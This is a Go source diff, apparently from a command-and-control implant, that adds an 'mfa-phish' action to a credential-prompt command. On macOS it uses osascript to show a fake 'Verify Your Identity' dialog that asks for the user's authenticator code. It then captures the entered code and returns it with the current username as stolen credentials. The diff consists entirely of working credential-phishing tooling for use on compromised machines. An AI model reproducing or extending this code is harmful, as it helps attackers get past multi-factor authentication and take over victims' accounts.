@@ -38,8 +38,12 @@ const credPromptTimeout = 5 * time.Minute
 
 func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
 	// Check for cross-platform MFA actions before platform-specific dialog
-	if action := credPromptExtractAction(task.Params); action == "device-code" || action == "mfa-fatigue" {
+	action := credPromptExtractAction(task.Params)
+	if action == "device-code" || action == "mfa-fatigue" {
 		return credPromptDeviceCodeFlow(task)
+	}
+	if action == "mfa-phish" {
+		return credPromptMFAPhishDarwin(task)
 	}
 
 	args, parseErr := unmarshalParams[credentialPromptArgs](task)
@@ -113,4 +117,60 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 		Completed:   true,
 		Credentials: &creds,
 	}
+}
+
+// credPromptMFAPhishDarwin displays an MFA phishing dialog on macOS using AppleScript.
+func credPromptMFAPhishDarwin(task structs.Task) structs.CommandResult {
+	args, parseErr := unmarshalParams[credentialPromptArgs](task)
+	if parseErr != nil {
+		return *parseErr
+	}
+
+	title := args.Title
+	if title == "" {
+		title = "Verify Your Identity"
+	}
+	message := args.Message
+	if message == "" {
+		message = "Enter the verification code from your authenticator app to continue."
+	}
+	icon := args.Icon
+	if icon == "" {
+		icon = "caution"
+	}
+
+	// AppleScript dialog with VISIBLE text field (not hidden) for MFA code
+	script := fmt.Sprintf(`display dialog %s with title %s default answer "" with icon %s giving up after 300`,
+		escapeAppleScript(message), escapeAppleScript(title), icon)
+
+	ctx, cancel := context.WithTimeout(context.Background(), credPromptTimeout)
+	defer cancel()
+
+	out, err := exec.CommandContext(ctx, "osascript", "-e", script).CombinedOutput()
+	defer structs.ZeroBytes(out)
+	if err != nil {
+		output := strings.TrimSpace(string(out))
+		if strings.Contains(output, "User canceled") || strings.Contains(output, "(-128)") {
+			return successResult("User cancelled the MFA dialog")
+		}
+		return errorf("MFA dialog failed: %v\n%s", err, output)
+	}
+
+	// osascript returns "text returned:<value>, gave up:false"
+	result := strings.TrimSpace(string(out))
+	code := result
+	if idx := strings.Index(result, "text returned:"); idx >= 0 {
+		code = result[idx+len("text returned:"):]
+		if commaIdx := strings.Index(code, ", gave up:"); commaIdx >= 0 {
+			code = code[:commaIdx]
+		}
+	}
+	code = strings.TrimSpace(code)
+
+	username := "unknown"
+	if u, err := user.Current(); err == nil {
+		username = u.Username
+	}
+
+	return credPromptMFAPhishResult(code, title, username, "macOS")
 }
